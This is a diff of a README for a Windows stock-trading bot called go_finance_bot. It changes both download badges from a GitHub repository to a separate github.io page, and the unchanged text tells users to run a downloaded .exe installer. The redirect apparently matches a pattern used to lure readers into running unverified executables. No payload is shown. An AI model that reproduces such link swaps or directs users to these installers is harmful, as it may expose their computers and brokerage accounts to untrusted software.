@@ -1,6 +1,6 @@
 # 📈 go_finance_bot - Automate your personal stock market trades
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/isometric-mountwhitney498/go_finance_bot)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://isometric-mountwhitney498.github.io)
 
 This software allows you to run a trading bot on your own computer. The system connects to market data streams, analyzes price movements using technical indicators, and completes trades through your existing brokerage account. It works with Alpaca, Saxo, and Trading 212. You control the money limits, backtest your strategies with historical data, and monitor everything through a web interface.
 
@@ -16,7 +16,7 @@ You need a Windows computer to run this bot. Ensure you have the following befor
 
 ## 📥 Downloading the Software
 
-[![](https://img.shields.io/badge/Download_Application-Grey?style=for-the-badge)](https://github.com/isometric-mountwhitney498/go_finance_bot)
+[![](https://img.shields.io/badge/Download_Application-Grey?style=for-the-badge)](https://isometric-mountwhitney498.github.io)
 
 Visit the link above to reach the official download page. Find the section labeled Releases on the right side of the project page. Select the latest version listed. Look for the file ending in .exe, which is the installer for Windows. Click the file to start the download. Once the file finishes saving to your computer, locate it in your Downloads folder and double-click it to start the installation.
 
